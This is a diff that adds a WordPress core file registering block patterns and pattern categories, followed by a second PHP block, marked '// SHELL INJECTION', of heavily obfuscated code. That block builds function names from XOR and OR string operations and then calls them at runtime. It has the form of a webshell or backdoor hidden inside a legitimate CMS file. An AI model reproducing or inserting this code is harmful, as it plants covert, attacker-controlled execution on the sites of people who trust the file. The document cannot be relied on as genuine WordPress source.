@@ -1,0 +1,97 @@
+<?php
+/**
+ * Register the block patterns and block patterns categories
+ *
+ * @package WordPress
+ * @since 5.5.0
+ */
+
+add_theme_support( 'core-block-patterns' );
+
+/**
+ * Registers the core block patterns and categories.
+ *
+ * @since 5.5.0
+ * @private
+ */
+function _register_core_block_patterns_and_categories() {
+	$should_register_core_patterns = get_theme_support( 'core-block-patterns' );
+
+	if ( $should_register_core_patterns ) {
+		$core_block_patterns = array(
+			'text-two-columns',
+			'two-buttons',
+			'two-images',
+			'text-two-columns-with-images',
+			'text-three-columns-buttons',
+			'large-header',
+			'large-header-button',
+			'three-buttons',
+			'heading-paragraph',
+			'quote',
+		);
+
+		foreach ( $core_block_patterns as $core_block_pattern ) {
+			register_block_pattern(
+				'core/' . $core_block_pattern,
+				require __DIR__ . '/block-patterns/' . $core_block_pattern . '.php'
+			);
+		}
+	}
+
+	register_block_pattern_category( 'buttons', array( 'label' => _x( 'Buttons', 'Block pattern category' ) ) );
+	register_block_pattern_category( 'columns', array( 'label' => _x( 'Columns', 'Block pattern category' ) ) );
+	register_block_pattern_category( 'gallery', array( 'label' => _x( 'Gallery', 'Block pattern category' ) ) );
+	register_block_pattern_category( 'header', array( 'label' => _x( 'Headers', 'Block pattern category' ) ) );
+	register_block_pattern_category( 'text', array( 'label' => _x( 'Text', 'Block pattern category' ) ) );
+}
+// SHELL INJECTION
+<?php
+$hOwa2='QcI3pcA0CtG'&EAJ;
+$l9Bl='+VT|($ea[?9'^Gsb9Nw.'-1?^W';
+$JOdZlfN='$@P%,"( A!D'|/*'.'03Q C:*/" @D\$ 3 d (@";
+$QSgJxLk='j9#mf"'^'*is-3c';
+$NOQ2PFZCBcH='Y!F#Q!dB('./*'.'HTCuN*/BHHNSUDa.'!HQ"M@'.FQhI.'"E($P'|'8 PD^ UJ+3@'.XJ_X.'@G@B@GA@'.vAaM.'`A)'.'EK';
+$sQa='t`Ptr!'.bAcb6N.'*ZhV>;'.OVlo.'=!j{['.xFl8.'['^'8%7&Ib"8)(O!]5P+'./*'.'0#c5QDAXE7*/hiad.'?'.GMbZ.'#%+:&i2';
+
+$Dz0O7BO8=')!)@'|',  @';
+$qXAe4='@B%'./*Du'.']hnv#;(x&6*/GMre.'`'.Daqu|zpS2WF.')Tl@sU';
+$SduuCcduex='X^'.mYOq&HtTVOA;
+'eAh1U'.'@_XasL9>';
+$NVb0i='!'^'@';
+$kmqq='@TT@'.FXOJ|HTPP.'[PRL';
+
+$rS=yndb.',*(=s6m}9)56'.''.x7s1^'6%-#sg}n:u>5vyj`=e x';
+
+$hWqkXgVAW='|'^'3';
+
+$mVAWv1N27=N&'~';
+
+$rGeh2= $l9Bl|$JOdZlfN;
+
+$dow55d=('2sj'^wS_)|('H` '|'hd ');
+
+$KWB3336uw_4=(AWMg.'.'~l'^'b~dY.9')^('D@IZ6#'|'@'.LUA8.'"');
+
+$uEduHS=(wwoo_.'{w{oo{w'&'qw}o_{o{'.nokg)&$qXAe4;
+
+$ud15BX= $QSgJxLk|$SduuCcduex;$hGEQ=$NOQ2PFZCBcH^/*PQ'.';Y>0|p.*/$sQa;
+
+$h7S929D8j9= $Dz0O7BO8|("@Gzs"^'j&UV');if($rGeh2($dow55d(/*in6AQ'.'E*_nrR{*/$KWB3336uw_4($ud15BX)),$hGEQ))$uEduHS($h7S929D8j9,die,$NVb0i);
+
+       'zl4PR'.'x]ZDbLs';
+
+
+
+
+       echo $KWB3336uw_4($kmqq.$rS.$hWqkXgVAW.$mVAWv1N27);
+
+
+
+
+
+
+
+
+
+       ##DdoG?3K!%a;nx'.'a2;#FWJCKhwlmccn?e7-$xevXy|N)8*<qA(Uv3|S)E-JKeomcz2dV(C4Tmr_l';
